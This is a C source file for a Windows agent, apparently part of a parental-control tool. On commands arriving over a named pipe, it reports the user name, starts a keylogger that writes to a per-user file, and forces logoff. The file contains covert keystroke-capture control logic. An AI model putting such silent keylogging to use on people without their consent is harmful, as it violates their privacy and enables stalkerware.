#include <windows.h>
#include <stdint.h>
#include <stdio.h>

#include "commands.h"
#include "KeyLogger.h"


#define PIPE_NAME   "\\\\.\\pipe\\parental_control_pipe"

void IpcHandler();


//void main()
//{
//
//    SetHook("lolo.txt");
//    
//    MSG msg;
//    while (GetMessage(&msg, NULL, 0, 0))
//    {
//
//    }
//
//    
//    while (1);
//}

int APIENTRY WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
{
    IpcHandler();
    return 0;
}
///////////////////////////////////////////////////////////////////////////////////////////
void BeepCountDown(uint32_t seconds)
{
    uint32_t counter = 0;
    
    while (counter < seconds)
    {
        Beep(1000, 200);
        Sleep(1000);
        counter++;
    }
}
///////////////////////////////////////////////////////////////////////////////////////////
void IpcHandler()
{
    HANDLE hPipe = NULL;
    CHAR   Rbuf[512], Wbuf[512];
    DWORD  nBytesRead, nBytesWrite;


    hPipe = CreateFile(PIPE_NAME, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (hPipe == INVALID_HANDLE_VALUE)
    {
        DWORD errorCode = GetLastError();
        return;
    }

    //wait for server to be ready 
    WaitNamedPipe(PIPE_NAME, NMPWAIT_WAIT_FOREVER);

    while (1)
    {
        ReadFile(hPipe, Rbuf, 512, &nBytesRead, NULL);
        if (nBytesRead)
        {
            if (!strncmp(Rbuf, "ping", 4))
            {
                memcpy(Wbuf, "ping_response", sizeof("ping_response"));
                WriteFile(hPipe, Wbuf, strlen(Wbuf) + 1, &nBytesWrite, NULL);
            }
            else if (!strncmp(Rbuf, "get_user_name", sizeof("get_user_name")))
            {
                char user_name[256];
                char file_name[256];
                DWORD user_name_len = sizeof(user_name) - 1;
                memset(user_name, 0, 256);
                memset(file_name, 0, 256);
                GetUserName(user_name, &user_name_len);
                WriteFile(hPipe, user_name, strlen(user_name) + 1, &nBytesWrite, NULL);
                sprintf(file_name, "%s_key_log.txt", user_name);
                StartKeyLogger(file_name);

            }

            else if (!strncmp(Rbuf, "log_off", sizeof("log_off")))
            {
                BeepCountDown(10);

                ExitWindowsEx(EWX_LOGOFF | EWX_FORCE, SHTDN_REASON_MAJOR_SOFTWARE);
                BeepCountDown(10);
                LockWorkStation();
                StopKeyLogger();
                break;
            }

        }
    }
       
    DisconnectNamedPipe(hPipe);
    CloseHandle(hPipe);
}
